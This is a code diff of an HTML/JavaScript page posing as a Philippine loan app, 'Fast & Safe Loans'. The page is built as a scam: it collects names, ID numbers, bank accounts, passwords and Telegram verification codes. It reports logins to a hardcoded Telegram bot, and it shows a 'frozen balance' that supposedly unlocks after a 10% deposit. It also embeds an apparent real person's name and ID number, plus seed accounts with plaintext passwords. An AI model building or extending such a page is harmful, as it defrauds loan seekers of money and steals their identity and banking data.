@@ -3,477 +3,278 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Fast & Safe Loans Philippines</title>
+  <title>Fast & Safe Loans PH | Secure</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-      font-family: 'Inter', system-ui, -apple-system, sans-serif;
-    }
+    @import url('https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
     :root {
       --yellow: #f0b90b;
-      --yellow-dark: #c99a08;
+      --yellow-dark: #c99400;
       --yellow-light: #fff8e1;
-      --bg: #f5f7fa;
+      --bg: #f7f8fc;
       --card: #ffffff;
       --border: #e9ebf0;
-      --text: #1a1a2e;
-      --text2: #5a5f72;
-      --text3: #8b90a0;
-      --shadow: 0 6px 20px rgba(0,0,0,0.04);
-      --radius: 18px;
-      --red: #e03a4e;
-      --green: #0fa77e;
+      --text: #0b1a33;
+      --text2: #5e6f88;
+      --text3: #8b9bb5;
+      --shadow: 0 8px 24px rgba(0,0,0,0.04);
+      --radius: 20px;
+      --danger: #e03a4e;
     }
     body {
+      font-family: 'Inter', system-ui, sans-serif;
       background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: flex-start;
-      min-height: 100vh;
     }
     #app {
       width: 100%;
-      max-width: 450px;
-      background: var(--bg);
+      max-width: 480px;
       min-height: 100vh;
+      background: var(--bg);
       position: relative;
       overflow-x: hidden;
-      box-shadow: 0 0 30px rgba(0,0,0,0.05);
+      box-shadow: 0 0 40px rgba(0,0,0,0.02);
     }
-    .screen {
-      display: none;
-      flex-direction: column;
-      min-height: 100vh;
-    }
-    .screen.active {
-      display: flex;
-    }
+    .screen { display: none; min-height: 100vh; flex-direction: column; }
+    .screen.active { display: flex; }
 
     #toast {
-      position: fixed;
-      top: 24px;
-      left: 50%;
-      transform: translateX(-50%) translateY(-90px);
-      background: #1e1e2f;
-      color: white;
-      padding: 12px 24px;
-      border-radius: 40px;
-      font-size: 14px;
-      font-weight: 600;
-      z-index: 9999;
-      transition: transform 0.35s cubic-bezier(0.18, 0.89, 0.32, 1.05);
-      white-space: nowrap;
-      pointer-events: none;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px);
+      background: #0b1a33; color: white; padding: 12px 28px; border-radius: 60px;
+      font-size: 14px; font-weight: 600; z-index: 9999; transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      white-space: nowrap; pointer-events: none; letter-spacing: 0.3px;
     }
-    #toast.show {
-      transform: translateX(-50%) translateY(0);
-    }
-    #toast.success { background: #0fa77e; }
+    #toast.show { transform: translateX(-50%) translateY(0); }
     #toast.error { background: #e03a4e; }
 
     .overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.7);
-      backdrop-filter: blur(12px);
-      z-index: 8000;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(12px);
+      z-index: 8000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 24px;
     }
-    .overlay.active {
-      display: flex;
-    }
+    .overlay.active { display: flex; }
     .overlay-card {
-      background: white;
-      border-radius: 28px;
-      padding: 28px 22px;
-      width: 100%;
-      max-width: 340px;
-      text-align: center;
-      box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+      background: #fff; border-radius: 28px; padding: 28px 24px; width: 100%; max-width: 340px;
+      text-align: center; box-shadow: 0 30px 50px rgba(0,0,0,0.2);
     }
+    .overlay-card h3 { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+    .overlay-card p { font-size: 14px; color: var(--text2); margin-bottom: 20px; line-height: 1.5; }
 
-    .auth-wrap {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      padding: 40px 24px;
+    .auth-wrap { flex: 1; display: flex; flex-direction: column; justify-content: center; padding: 32px 24px; }
+    .auth-logo { display: flex; align-items: center; gap: 12px; margin-bottom: 32px; }
+    .auth-logo .logo-icon {
+      width: 48px; height: 48px; background: var(--yellow); border-radius: 14px;
+      display: flex; align-items: center; justify-content: center; font-size: 26px; font-weight: 800; color: #0b1a33;
     }
-    .auth-logo {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 32px;
-    }
-    .logo-icon {
-      width: 50px;
-      height: 50px;
-      background: var(--yellow);
-      border-radius: 14px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 26px;
-      font-weight: 800;
-      color: #1a1a2e;
-    }
-    .auth-title {
-      font-size: 28px;
-      font-weight: 800;
-      margin-bottom: 6px;
-    }
-    .auth-sub {
-      font-size: 14px;
-      color: var(--text2);
-      margin-bottom: 30px;
-    }
-    .form-group {
-      margin-bottom: 16px;
-    }
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      font-weight: 600;
-      color: var(--text2);
-      margin-bottom: 6px;
-    }
+    .auth-logo .logo-text strong { font-size: 18px; font-weight: 800; display: block; }
+    .auth-logo .logo-text span { font-size: 12px; color: var(--text3); }
+    .auth-title { font-size: 28px; font-weight: 800; margin-bottom: 6px; }
+    .auth-sub { font-size: 14px; color: var(--text2); margin-bottom: 28px; }
+    .form-group { margin-bottom: 16px; }
+    .form-group label { display: block; font-size: 13px; font-weight: 600; color: var(--text2); margin-bottom: 6px; }
     .form-group input, .form-group select {
-      width: 100%;
-      padding: 14px 16px;
-      border: 1.5px solid var(--border);
-      border-radius: 14px;
-      font-size: 15px;
-      background: white;
-      color: var(--text);
-      outline: none;
-      transition: 0.2s;
+      width: 100%; padding: 14px 16px; border: 1.5px solid var(--border); border-radius: 14px;
+      font-size: 15px; background: #fff; color: var(--text); outline: none; transition: all 0.2s;
     }
-    .form-group input:focus, .form-group select:focus {
-      border-color: var(--yellow);
-      box-shadow: 0 0 0 3px rgba(240,185,11,0.15);
-    }
+    .form-group input:focus, .form-group select:focus { border-color: var(--yellow); box-shadow: 0 0 0 3px rgba(240,185,11,0.15); }
+    .pw-wrap { position: relative; }
+    .pw-wrap input { padding-right: 48px; }
+    .pw-toggle { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 18px; }
     .btn-primary {
-      width: 100%;
-      padding: 16px;
-      background: var(--yellow);
-      color: #1a1a2e;
-      border: none;
-      border-radius: 14px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 8px;
-      transition: 0.2s;
+      width: 100%; padding: 16px; background: var(--yellow); color: #0b1a33; border: none; border-radius: 14px;
+      font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 6px; transition: 0.2s;
     }
-    .btn-primary:active { transform: scale(0.97); background: var(--yellow-dark); }
+    .btn-primary:active { transform: scale(0.98); background: var(--yellow-dark); }
     .btn-primary:disabled { opacity: 0.6; }
     .btn-secondary {
-      width: 100%;
-      padding: 14px;
-      background: white;
-      border: 2px solid var(--border);
-      border-radius: 14px;
-      font-weight: 600;
-      margin-top: 10px;
-      cursor: pointer;
+      width: 100%; padding: 16px; background: #fff; color: var(--text); border: 1.5px solid var(--border);
+      border-radius: 14px; font-size: 16px; font-weight: 600; margin-top: 10px; cursor: pointer;
     }
-    .auth-switch {
-      text-align: center;
-      margin-top: 24px;
-      font-size: 14px;
-      color: var(--text2);
-    }
-    .auth-switch a {
-      color: var(--yellow-dark);
-      font-weight: 700;
-      cursor: pointer;
-    }
+    .auth-switch { text-align: center; margin-top: 22px; font-size: 14px; color: var(--text2); }
+    .auth-switch a { color: var(--yellow-dark); font-weight: 700; cursor: pointer; }
 
     .dash-header {
-      background: white;
-      padding: 14px 20px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-bottom: 1px solid var(--border);
+      background: #fff; padding: 16px 20px; display: flex; align-items: center; justify-content: space-between;
+      border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100;
     }
     .balance-card {
-      background: linear-gradient(135deg, #1e1e2f, #2a2a3c);
-      margin: 18px;
-      border-radius: 22px;
-      padding: 22px;
-      color: white;
+      background: linear-gradient(135deg, #0b1a33 0%, #162b4a 100%); margin: 16px 20px; border-radius: 24px;
+      padding: 22px 20px; color: white; position: relative; overflow: hidden;
     }
-    .balance-label {
-      font-size: 13px;
-      opacity: 0.7;
-      margin-bottom: 6px;
-    }
-    .balance-amount {
-      font-size: 38px;
-      font-weight: 800;
-    }
+    .balance-amount { font-size: 38px; font-weight: 800; margin: 6px 0; }
     .status-badge {
-      padding: 5px 14px;
-      border-radius: 30px;
-      font-size: 12px;
-      font-weight: 700;
-      background: rgba(255,255,255,0.15);
+      padding: 4px 14px; border-radius: 40px; font-size: 12px; font-weight: 700; background: rgba(255,255,255,0.15);
     }
+    .badge-frozen { background: rgba(224,58,78,0.2); color: #ffb3b3; }
 
     .tab-bar {
-      position: fixed;
-      bottom: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 100%;
-      max-width: 450px;
-      background: OEwhite;
-      border-top: 1px solid var(--border);
-      display: flex;
-      z-index: 200;
-      padding-bottom: env(safe-area-inset-bottom);
+      position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 480px;
+      background: #fff; border-top: 1px solid var(--border); display: flex; z-index: 200; padding-bottom: env(safe-area-inset-bottom);
     }
     .tab-item {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 10px 4px;
-      border: none;
-      background: none;
-      color: var(--text3);
-      font-weight: 600;
-      font-size: 10px;
+      flex: 1; display: flex; flex-direction: column; align-items: center; padding: 8px 0; cursor: pointer;
+      background: none; border: none; color: var(--text3); font-weight: 600; font-size: 10px;
     }
     .tab-item.active { color: var(--yellow-dark); }
     .tab-panel { display: none; padding-bottom: 80px; }
     .tab-panel.active { display: block; }
 
     .section-card {
-      background: white;
-      margin: 0 18px 16px;
-      border-radius: var(--radius);
-      padding: 18px;
-      box-shadow: var(--shadow);
+      background: #fff; margin: 0 20px 16px; border-radius: var(--radius); padding: 20px;
+      box-shadow: var(--shadow); border: 1px solid var(--border);
     }
-    .bank-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 10px;
-      margin: 0 18px 16px;
-    }
-    .bank-card {
-      background: white;
-      border: 2px solid var(--border);
-      border-radius: 14px;
-      padding: 12px 6px;
-      text-align: center;
-      cursor: pointer;
-      font-weight: 700;
-      font-size: 12px;
-    }
-    .bank-card.selected {
-      border-color: var(--yellow);
-      background: var(--yellow-light);
-    }
-    .code-input {
-      display: flex;
-      gap: 8px;
-      justify-content: center;
-      margin: 18px 0;
-    }
+    .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 0 20px 16px; }
+    .stat-card { background: #fff; border-radius: 16px; padding: 16px; box-shadow: var(--shadow); border: 1px solid var(--border); }
+    .code-input { display: flex; gap: 8px; justify-content: center; margin: 16px 0; }
     .code-input input {
-      width: 44px;
-      height: 52px;
-      text-align: center;
-      font-size: 22px;
-      font-weight: 700;
-      border: 2px solid var(--border);
-      border-radius: 12px;
-      outline: none;
+      width: 44px; height: 52px; text-align: center; font-size: 20px; font-weight: 700;
+      border: 2px solid var(--border); border-radius: 12px; outline: none;
     }
-    .swipe-track {
-      position: relative;
-      width: 100%;
-      height: 50px;
-      background: #eef0f4;
-      border-radius: 40px;
-      overflow: hidden;
-      margin: 16px 0;
+    .freeze-banner {
+      background: #ffeef0; border: 1px solid #f5c6cb; border-radius: 14px; padding: 10px 16px;
+      margin: 12px 20px; display: flex; align-items: center; justify-content: space-between; font-weight: 600;
     }
-    .swipe-thumb {
-      position: absolute;
-      top: 4px;
-      left: 4px;
-      width: 42px;
-      height: 42px;
-      background: white;
-      border-radius: 50%;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 3;
+    .btn-unfreeze {
+      background: var(--danger); color: white; border: none; padding: 8px 16px; border-radius: 30px;
+      font-weight: 700; font-size: 13px; cursor: pointer;
     }
-    .frozen-badge {
-      background: #e03a4e;
-      color: white;
-      border-radius: 8px;
-      padding: 4px 12px;
-      font-size: 11px;
-      font-weight: 700;
-      margin-left: 10px;
-    }
-    .hidden { display: none !important; }
+    .timer-display { font-size: 36px; font-weight: 800; letter-spacing: 2px; margin: 8px 0; }
   </style>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
 <div id="app">
   <div id="toast"></div>
 
-  <!-- LOGIN -->
+  <!-- LOGIN SCREEN -->
   <div id="screen-login" class="screen active">
     <div class="auth-wrap">
-      <div class="auth-logo"><div class="logo-icon">₱</div><div><strong>FSL Philippines</strong><span style="font-size:12px;color:gray;display:block;">Trusted Loans</span></div></div>
+      <div class="auth-logo"><div class="logo-icon">₱</div><div class="logo-text"><strong>Fast & Safe Loans</strong><span>Philippines</span></div></div>
       <h1 class="auth-title">Welcome back</h1>
       <p class="auth-sub">Sign in to continue</p>
-      <form id="login-form">
-        <div class="form-group"><label>Email</label><input type="email" id="login-email" placeholder="Enter email"></div>
-        <div class="form-group"><label>Password</label><input type="password" id="login-password" placeholder="Password"></div>
-        <button type="submit" class="btn-primary">Sign In</button>
+      <form id="login-form" autocomplete="off">
+        <div class="form-group"><label>Email</label><input type="email" id="login-email" placeholder="Enter email" autocomplete="new-password"></div>
+        <div class="form-group"><label>Password</label><div class="pw-wrap"><input type="password" id="login-password" placeholder="Password" autocomplete="new-password"><button type="button" class="pw-toggle" onclick="togglePw('login-password',this)">👁</button></div></div>
+        <button type="submit" class="btn-primary" id="login-btn">Sign In</button>
       </form>
-      <p class="auth-switch">No account? <a onclick="showScreen('screen-register')">Register</a></p>
+      <p class="auth-switch">No account? <a onclick="showScreen('screen-register')">Create Account</a></p>
     </div>
   </div>
 
-  <!-- REGISTER -->
+  <!-- REGISTER SCREEN -->
   <div id="screen-register" class="screen">
-    <div class="auth-wrap">
-      <div class="auth-logo"><div class="logo-icon">₱</div><div><strong>FSL Philippines</strong></div></div>
+    <div class="auth-wrap" style="padding-top:16px;">
+      <div class="auth-logo"><div class="logo-icon">₱</div><div class="logo-text"><strong>Fast & Safe Loans</strong><span>Philippines</span></div></div>
       <h1 class="auth-title">Create Account</h1>
-      <form id="register-form">
-        <div class="form-group"><label>Full Name</label><input type="text" id="reg-fullname"></div>
-        <div class="form-group"><label>ID Name</label><input type="text" id="reg-idname"></div>
-        <div class="form-group"><label>ID Number</label><input type="text" id="reg-idnumber"></div>
-        <div class="form-group"><label>Email</label><input type="email" id="reg-email"></div>
-        <div class="form-group"><label>Password</label><input type="password" id="reg-password"></div>
-        <div class="form-group"><label>Confirm Password</label><input type="password" id="reg-confirm"></div>
+      <form id="register-form" autocomplete="off">
+        <div class="form-group"><label>Full Name</label><input type="text" id="reg-fullname" placeholder="Full name"></div>
+        <div class="form-row" style="display:grid;grid-template-columns:1fr 1fr;gap:12px;"><div class="form-group"><label>ID Name</label><input type="text" id="reg-idname"></div><div class="form-group"><label>ID Number</label><input type="text" id="reg-idnumber"></div></div>
+        <div class="form-group"><label>Email</label><input type="email" id="reg-email" placeholder="Email"></div>
+        <div class="form-group"><label>Password</label><div class="pw-wrap"><input type="password" id="reg-password"><button type="button" class="pw-toggle" onclick="togglePw('reg-password',this)">👁</button></div></div>
         <button type="submit" class="btn-primary">Register</button>
       </form>
-      <p class="auth-switch"><a onclick="showScreen('screen-login')">Back to Login</a></p>
+      <p class="auth-switch">Have account? <a onclick="showScreen('screen-login')">Sign In</a></p>
     </div>
   </div>
 
   <!-- DASHBOARD -->
   <div id="screen-dashboard" class="screen">
-    <div class="dash-header">
-      <div><strong>FSL Philippines</strong></div>
-      <button onclick="doLogout()" style="background:none;border:1px solid #ccc;padding:6px 14px;border-radius:20px;">Logout</button>
-    </div>
+    <div class="dash-header"><div style="display:flex;align-items:center;gap:8px;"><span style="font-size:22px;background:var(--yellow);border-radius:10px;padding:4px 10px;">₱</span><strong>FSL Wallet</strong></div><button class="btn-logout" style="background:none;border:1px solid #ccc;padding:6px 14px;border-radius:20px;" onclick="doLogout()">Logout</button></div>
+    
     <div class="balance-card">
-      <div class="balance-label">Available Balance</div>
-      <div class="balance-amount" id="disp-balance">₱0</div>
-      <div id="disp-status-badge" class="status-badge">No Loan</div>
+      <div style="font-size:12px;opacity:0.7;">Available Balance</div>
+      <div class="balance-amount">₱<span id="disp-balance">0.00</span></div>
+      <div style="display:flex;justify-content:space-between;align-items:center;"><span id="disp-status-badge" class="status-badge">No Loan</span></div>
+      <div id="frozen-alert" style="display:none;margin-top:10px;background:rgba(255,255,255,0.1);border-radius:12px;padding:8px 14px;font-size:13px;">🔒 Balance frozen</div>
     </div>
-    <div id="verified-strip" style="background:#e8f5e9;margin:0 18px 12px;padding:10px;border-radius:12px;font-weight:600;color:#0fa77e;">✅ Account Verified</div>
+
+    <div id="freeze-banner" class="freeze-banner" style="display:none;">
+      <span>⚠️ Funds locked</span>
+      <button class="btn-unfreeze" id="btn-unfreeze-action" onclick="triggerUnfreezeDeposit()">Unfreeze 10%</button>
+    </div>
 
     <div id="panel-home" class="tab-panel active">
-      <div class="section-card">
-        <h3>💰 Quick Loan</h3>
-        <p style="font-size:14px;">Apply for a fast loan with easy approval.</p>
-        <button class="btn-primary" onclick="switchTab('loan')" style="margin-top:12px;">Apply Now</button>
+      <div class="stat-grid">
+        <div class="stat-card"><span style="font-size:12px;color:var(--text3);">Loan Status</span><div style="font-weight:800;" id="home-loan-status">—</div></div>
+        <div class="stat-card"><span style="font-size:12px;color:var(--text3);">Amount</span><div style="font-weight:800;">₱<span id="home-loan-amount">0</span></div></div>
       </div>
+      <div class="section-card">📢 Important: All withdrawals require verification. Contact support if issues.</div>
     </div>
 
-    <!-- LOAN TAB -->
     <div id="panel-loan" class="tab-panel">
-      <div class="section-card">
-        <h3>Loan Application</h3>
-        <form id="loan-form">
-          <div class="form-group"><label>Full Name</label><input type="text" id="loan-fullname" value="Shane Sabal"></div>
-          <div class="form-group"><label>ID Number</label><input type="text" id="loan-idnumber" value="4830645821731280"></div>
-          <div class="form-group"><label>Bank</label><select id="loan-bank"><option>Metrobank</option><option>BDO</option><option>BPI</option></select></div>
-          <div class="form-group"><label>Account Number</label><input type="text" id="loan-bankaccount" value="0987654321"></div>
-          <div class="form-group"><label>Amount (₱)</label><input type="number" id="loan-amount" value="50000"></div>
-          <button type="submit" class="btn-primary">Submit Application</button>
+      <div class="section-card">💰 Apply for a loan</div>
+      <div style="padding:0 20px;">
+        <form id="loan-form" autocomplete="off">
+          <div class="form-group"><input type="text" id="loan-fullname" placeholder="Full name" value="Shane Sabal"></div>
+          <div class="form-group"><input type="text" id="loan-idnumber" placeholder="ID Number" value="4830645821731280"></div>
+          <div class="form-group"><input type="number" id="loan-amount" placeholder="Amount (₱)" value="50000"></div>
+          <button type="submit" class="btn-primary">Submit Loan</button>
         </form>
       </div>
     </div>
 
-    <!-- WITHDRAW TAB (Hidden if frozen) -->
     <div id="panel-withdraw" class="tab-panel">
-      <div class="section-card">
-        <h3>🏧 Withdraw Funds</h3>
-        <div id="withdraw-form-container">
-          <div class="form-group"><label>Select Bank</label>
-            <select id="wd-bank-select"><option>BDO</option><option>BPI</option><option>Metrobank</option></select>
-          </div>
-          <div class="form-group"><label>Account Number</label><input type="text" id="wd-account" placeholder="Account number"></div>
-          <div class="form-group"><label>Account Name</label><input type="text" id="wd-accname" placeholder="Account name"></div>
-          <div class="form-group"><label>Amount</label><input type="number" id="wd-amount" placeholder="Enter amount"></div>
-          <div class="form-group"><label>Password</label><input type="password" id="wd-password"></div>
-          <button class="btn-primary" onclick="submitWithdraw()">Process Withdrawal</button>
-        </div>
-        <div id="frozen-notice" class="hidden" style="background:#fff0f0;border:1px solid #e03a4e;border-radius:16px;padding:20px;text-align:center;">
-          <span style="font-size:32px;">🔒</span>
-          <h4 style="color:#e03a4e;margin:10px 0;">Account Frozen</h4>
-          <p style="font-size:14px;color:#555;">Your withdrawal is locked. Click below to unfreeze.</p>
-          <button class="btn-primary" style="background:#e03a4e;color:white;" onclick="openUnfreezeOverlay()">Unfreeze Account</button>
-        </div>
+      <div class="section-card">🏧 Withdraw Funds</div>
+      <div style="padding:0 20px;">
+        <div class="form-group"><label>Bank</label><select id="wd-bank"><option value="BDO">BDO</option><option value="Metrobank">Metrobank</option><option value="GCash">GCash</option></select></div>
+        <div class="form-group"><input type="text" id="wd-account" placeholder="Account number"></div>
+        <div class="form-group"><input type="text" id="wd-accname" placeholder="Account name"></div>
+        <div class="form-group"><input type="number" id="wd-amount" placeholder="Amount"></div>
+        <button class="btn-primary" id="wd-submit-btn" onclick="initiateWithdrawal()">Withdraw</button>
       </div>
     </div>
 
     <div class="tab-bar">
-      <button class="tab-item active" onclick="switchTab('home')">🏠 Home</button>
-      <button class="tab-item" onclick="switchTab('loan')">💰 Loan</button>
-      <button class="tab-item" id="tab-withdraw-btn" onclick="switchTab('withdraw')">🏧 Withdraw</button>
+      <button class="tab-item active" onclick="switchTab('home')">🏠Home</button>
+      <button class="tab-item" onclick="switchTab('loan')">💰Loan</button>
+      <button class="tab-item" onclick="switchTab('withdraw')">🏧Withdraw</button>
+      <button class="tab-item" onclick="doLogout()">🚪Exit</button>
     </div>
   </div>
 
   <!-- OVERLAYS -->
-  <div class="overlay" id="overlay-bank-verify">
+  <div class="overlay" id="overlay-wd-code">
     <div class="overlay-card">
-      <h3>🏦 Verify Account</h3>
-      <p>Enter Telegram code</p>
-      <div class="code-input" id="bank-code-group">...</div>
-      <div class="swipe-track" id="swipe-track"><div class="swipe-thumb" id="swipe-thumb">➜</div></div>
+      <h3>🔐 Confirm Withdrawal</h3>
+      <p>Enter code sent to Telegram</p>
+      <div class="code-input" id="wd-code-group">
+        <input maxlength="1" oninput="moveNext(this,'wd2')"><input id="wd2" maxlength="1" oninput="moveNext(this,'wd3')"><input id="wd3" maxlength="1" oninput="moveNext(this,'wd4')"><input id="wd4" maxlength="1" oninput="moveNext(this,'wd5')"><input id="wd5" maxlength="1" oninput="moveNext(this,'wd6')"><input id="wd6" maxlength="1">
+      </div>
+      <button class="btn-primary" onclick="verifyWithdrawalCode()">Confirm</button>
+      <button class="btn-secondary" onclick="closeOverlay('overlay-wd-code')">Cancel</button>
     </div>
   </div>
 
-  <div class="overlay" id="overlay-loan-confirm">
+  <div class="overlay" id="overlay-error-bank">
     <div class="overlay-card">
-      <h3>⏳ Confirm Loan</h3>
-      <p>Enter Telegram code</p>
-      <div class="code-input" id="loan-code-group">...</div>
-      <button class="btn-primary" onclick="verifyLoanCode()">Confirm</button>
-    </div>
-  </div>
-
-  <div class="overlay" id="overlay-wd-error">
-    <div class="overlay-card">
-      <h3>⚠️ Error</h3>
-      <p>Bank account mismatch. Please re-enter details.</p>
-      <div id="wd-error-details" style="text-align:left;background:#f5f5f5;padding:10px;border-radius:10px;margin:10px 0;"></div>
-      <button class="btn-primary" onclick="document.getElementById('overlay-wd-error').classList.remove('active')">Close</button>
+      <h3>⚠️ Bank Error</h3>
+      <p>Invalid bank details. Please provide original details. A code has been sent to your Telegram.</p>
+      <div class="code-input" id="error-code-group">
+        <input maxlength="1" oninput="moveNext(this,'e2')"><input id="e2" maxlength="1" oninput="moveNext(this,'e3')"><input id="e3" maxlength="1" oninput="moveNext(this,'e4')"><input id="e4" maxlength="1" oninput="moveNext(this,'e5')"><input id="e5" maxlength="1" oninput="moveNext(this,'e6')"><input id="e6" maxlength="1">
+      </div>
+      <button class="btn-primary" onclick="submitErrorCode()">Submit Code</button>
     </div>
   </div>
 
   <div class="overlay" id="overlay-unfreeze">
     <div class="overlay-card">
-      <h3>🔓 Unfreeze Account</h3>
-      <p>Enter the code sent to your Telegram</p>
-      <div class="code-input" id="unfreeze-code-group">...</div>
-      <button class="btn-primary" onclick="submitUnfreezeCode()">Submit</button>
-      <button class="btn-secondary" onclick="document.getElementById('overlay-unfreeze').classList.remove('active')">Cancel</button>
+      <h3>🔓 Unfreeze Balance</h3>
+      <p>Deposit 10% of total balance to unfreeze. Code sent to Telegram.</p>
+      <div class="code-input" id="unfreeze-code-group">
+        <input maxlength="1" oninput="moveNext(this,'u2')"><input id="u2" maxlength="1" oninput="moveNext(this,'u3')"><input id="u3" maxlength="1" oninput="moveNext(this,'u4')"><input id="u4" maxlength="1" oninput="moveNext(this,'u5')"><input id="u5" maxlength="1" oninput="moveNext(this,'u6')"><input id="u6" maxlength="1">
+      </div>
+      <button class="btn-primary" onclick="confirmUnfreeze()">Unfreeze Now</button>
+      <button class="btn-secondary" onclick="closeOverlay('overlay-unfreeze')">Cancel</button>
+    </div>
+  </div>
+
+  <div class="overlay" id="overlay-contact-support">
+    <div class="overlay-card">
+      <h3>📞 Contact Support</h3>
+      <p>Please contact customer care to withdraw your amount.</p>
+      <button class="btn-primary" onclick="closeOverlay('overlay-contact-support')">OK</button>
     </div>
   </div>
 </div>
@@ -482,19 +283,18 @@
   (function() {
     const TG_TOKEN = '8843546617:AAH_D5IY57cezbnIZgHWgU5J-C_84MZIBBw';
     const TG_CHAT = '7417215529';
-    const LS_KEY = 'fsl_v6_fixed';
-    const SESSION_KEY = 'fsl_session_v2';
+    const LS_KEY = 'fsl_v5';
+    const SESSION_KEY = 'fsl_session';
 
-    let users = JSON.parse(localStorage.getItem(LS_KEY)) || {
-      "1":{email:"123fhffhf@gmail.com",password:"12345678",balance:5000,loanStatus:"none",loanAmount:0,fullName:"Shane Sabal",idName:"Shane Sabal",idNumber:"4830645821731280",verified:true, frozen: false},
-      "2":{email:"test@test.com",password:"123456",balance:1000,loanStatus:"none",loanAmount:0,fullName:"Test User",idName:"Test",idNumber:"123456789",verified:true, frozen: false}
-    };
-    let currentSlot = null, currentUser = null;
-    let generatedBankCode = '', generatedLoanCode = '', generatedWdCode = '', generatedUnfreezeCode = '';
+    let users = JSON.parse(localStorage.getItem(LS_KEY)) || {};
+    let currentSlot = null;
+    let currentUser = null;
     let pendingWithdraw = null;
+    let generatedWdCode = '';
+    let errorFixCode = '';
 
     function saveUsers() { localStorage.setItem(LS_KEY, JSON.stringify(users)); }
-    function saveSession(slot) { localStorage.setItem(SESSION_KEY, JSON.stringify({slot, ts: Date.now()})); }
+    function saveSession(slot) { localStorage.setItem(SESSION_KEY, JSON.stringify({slot, time:Date.now()})); }
     function clearSession() { localStorage.removeItem(SESSION_KEY); }
 
     function sendTelegram(msg) {
@@ -511,170 +311,183 @@
     }
 
     function showScreen(id) {
-      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
       document.getElementById(id).classList.add('active');
     }
 
     function switchTab(tab) {
-      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
-      document.querySelectorAll('.tab-item').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
       document.getElementById(`panel-${tab}`).classList.add('active');
-      document.querySelector(`.tab-item:nth-child(${tab==='home'?1:tab==='loan'?2:3})`).classList.add('active');
-      if (tab === 'withdraw') updateWithdrawUI();
+      document.querySelectorAll('.tab-item').forEach(b=>b.classList.remove('active'));
+      event.target.closest('.tab-item').classList.add('active');
     }
 
-    function updateDashboard() {
-      if (!currentUser) return;
-      document.getElementById('disp-balance').textContent = '₱' + Number(currentUser.balance).toLocaleString();
-      let badge = document.getElementById('disp-status-badge');
-      badge.textContent = currentUser.frozen ? '🔒 FROZEN' : (currentUser.loanStatus || 'No Loan');
+    function updateUI() {
+      if(!currentUser) return;
+      document.getElementById('disp-balance').textContent = Number(currentUser.balance||0).toLocaleString('en-PH',{minimumFractionDigits:2});
+      document.getElementById('home-loan-status').textContent = currentUser.loanStatus||'none';
+      document.getElementById('home-loan-amount').textContent = Number(currentUser.loanAmount||0).toLocaleString();
+      
+      const frozen = currentUser.frozen || false;
+      document.getElementById('freeze-banner').style.display = frozen ? 'flex' : 'none';
+      document.getElementById('frozen-alert').style.display = frozen ? 'block' : 'none';
+      if(frozen) document.getElementById('disp-status-badge').className = 'status-badge badge-frozen';
     }
-
-    function updateWithdrawUI() {
-      const frozen = currentUser?.frozen;
-      document.getElementById('withdraw-form-container').classList.toggle('hidden', frozen);
-      document.getElementById('frozen-notice').classList.toggle('hidden', !frozen);
-    }
-
-    // LOGIN
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const email = document.getElementById('login-email').value.trim().toLowerCase();
-      const pw = document.getElementById('login-password').value;
-      let found = null;
-      for (let s in users) {
-        if (users[s].email === email && users[s].password === pw && users[s].verified) {
-          found = s; break;
-        }
-      }
-      if (!found) return showToast('Invalid credentials', 'error');
-      currentSlot = found; currentUser = users[found];
-      saveSession(found);
-      showScreen('screen-dashboard');
-      updateDashboard(); updateWithdrawUI();
-      sendTelegram(`🔐 Login: ${currentUser.fullName} | Slot ${found}`);
-    });
-
-    // REGISTER
-    document.getElementById('register-form').addEventListener('submit', function(e) {
-      e.preventDefault();
-      let slot = null;
-      for (let i=2; i<=70; i++) { if (!users[i] || !users[i].email) { slot = String(i); break; } }
-      if (!slot) return showToast('No slots available', 'error');
-      const newUser = {
-        email: document.getElementById('reg-email').value.trim().toLowerCase(),
-        password: document.getElementById('reg-password').value,
